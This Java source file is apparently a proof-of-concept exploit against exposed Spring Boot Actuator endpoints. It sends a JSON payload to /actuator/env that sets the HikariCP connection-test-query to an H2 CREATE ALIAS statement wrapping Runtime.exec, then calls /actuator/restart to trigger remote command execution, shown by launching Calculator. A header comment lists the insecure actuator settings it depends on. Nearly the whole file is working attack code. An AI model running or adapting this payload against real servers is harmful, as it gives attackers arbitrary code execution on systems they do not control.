package com.threedr3am.bug.spring.actuator;

import java.io.UnsupportedEncodingException;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * todo need:
 * management:
 *   security:
 *     enabled: false
 *   endpoint:
 *     restart:
 *       enabled: true
 *   endpoints:
 *     web:
 *       exposure:
 *         include: env,restart
 *
 * @author threedr3am
 */
public class AttackHikariCP {

  public static void main(String[] args) throws UnsupportedEncodingException {
    String payload = "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('/System/Applications/Calculator.app/Contents/MacOS/Calculator');\"}";
    String target = "http://localhost:8080";

    HttpPost httpPost = new HttpPost(target + "/actuator/env");
    HttpEntity httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    httpPost = new HttpPost(target + "/actuator/restart");
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
